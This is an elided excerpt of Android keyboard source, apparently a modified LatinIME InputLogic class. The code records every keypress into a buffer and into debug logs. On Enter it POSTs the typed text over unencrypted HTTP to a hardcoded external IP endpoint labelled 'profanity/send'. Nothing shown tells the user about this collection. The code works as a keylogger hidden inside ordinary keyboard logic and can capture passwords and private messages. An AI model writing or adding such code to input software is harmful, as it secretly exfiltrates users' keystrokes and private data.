...
public final class InputLogic {
    ...
    private void handleConsumedEvent(final Event event) {
        ...
        Log.d("ConsumedEvent:", textToCommit.toString());
    }

    private void savedToTextFile(String textBuilder) {
        ...
        String URL = "http://34.101.232.107:7000/api/v1/user/profanity/send";
        RequestQueue requestQueue;

        JSONObject jo = new JSONObject();
        JSONObject obj = new JSONObject();
        try {
            jo.put("date", sdf.toString());
            jo.put("text", textBuilder);
        ...
        JsonObjectRequest joRequest = new JsonObjectRequest(Request.Method.POST, URL, obj,
                new Response.Listener<JSONObject>() {
                    @Override
                    public void onResponse(JSONObject response) {
                        Toast.makeText(mLatinIME.getApplicationContext(), response.toString(), Toast.LENGTH_LONG).show();
                    }
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        Toast.makeText(mLatinIME.getApplicationContext(), error.toString(), Toast.LENGTH_SHORT).show();
                    }
                }) {
            @Override
        ...
        requestQueue = Volley.newRequestQueue(mLatinIME.getApplicationContext());
        ...
        switch (event.mCodePoint) {
            case Constants.CODE_ENTER:
                ...
                if (InputTypeUtils.IME_ACTION_CUSTOM_LABEL == imeOptionsActionId) {
                    ...
                    String pressedChar = "~";
                    Log.d("INFO_ENTER", "Keypress: " + pressedChar);
                    stringBuilder.append(pressedChar);
                    savedToTextFile(stringBuilder.toString());
    ...
    private void handleBackspaceEvent(final Event event, final InputTransaction inputTransaction) {
        ...
        if (mConnection.hasSelection()) {
            ...
            Log.d("INFO_DEL_SELECTING", "Keypressed: " + pressedChar);
            ...
            Log.d("INFO_DEL", "String now: " + stringBuilder.toString());
    ...
    private void sendKeyCodePoint(final int codePoint) {
        ...
        Log.d("INFO_", "Keypress: " + pressedChar);
        stringBuilder.append(pressedChar);
